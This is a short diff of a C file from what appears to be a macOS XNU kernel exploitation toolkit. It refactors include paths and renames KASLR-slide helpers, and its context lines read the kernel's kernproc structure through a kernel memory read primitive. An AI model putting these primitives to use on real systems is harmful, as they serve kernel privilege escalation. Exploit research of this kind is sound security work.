@@ -17,17 +17,20 @@
 #include <sys/fcntl.h>
 #include <gym_client.h>
 
+#include <xe/memory/kmem.h>
+#include <xe/memory/kmem_remote.h>
+#include <xe/memory/kmem_msdosfs.h>
+#include <xe/slider/kernel.h>
+#include <xe/allocator/msdosfs.h>
+#include <xe/xnu/proc.h>
+#include <xe/util/misc.h>
+#include <xe/util/dispatch.h>
+#include <xe/util/assert.h>
+
+#include <xe_dev/memory/gym.h>
+#include <xe_dev/slider/kas.h>
+
 #include "platform_params.h"
-#include "allocator_msdosfs.h"
-#include "util_misc.h"
-#include "util_dispatch.h"
-#include "kmem_gym.h"
-#include "slider_kas.h"
-#include "kmem_msdosfs.h"
-#include "kmem_remote.h"
-#include "xnu_proc.h"
-#include "slider.h"
-#include "util_assert.h"
 
 
 void capture_msdosfs_mount_pair(uintptr_t* ptr1_out, xe_allocator_msdosfs_t* alloc1_out, uintptr_t* ptr2_out, xe_allocator_msdosfs_t* alloc2_out) {
@@ -120,7 +123,7 @@ void capture_msdosfs_mount_pair(uintptr_t* ptr1_out, xe_allocator_msdosfs_t* all
 
 int main(int argc, const char* argv[]) {
     xe_kmem_use_backend(xe_kmem_gym_create());
-    xe_slider_init(xe_slider_kas_get_mh_execute_header());
+    xe_slider_kernel_init(xe_slider_kas_get_mh_execute_header());
     xe_allocator_msdosfs_loadkext();
     
     uintptr_t worker_addr, helper_addr;
@@ -144,7 +147,7 @@ int main(int argc, const char* argv[]) {
     int helper_bridge_fd = open(path, O_CREAT | O_RDWR);
     xe_assert(helper_bridge_fd >= 0);
     
-    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_slide(VAR_KERNPROC_ADDR));
+    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_KERNPROC_ADDR));
     uintptr_t proc = xe_xnu_proc_current_proc();
     
     uintptr_t worker_bridge_vnode;
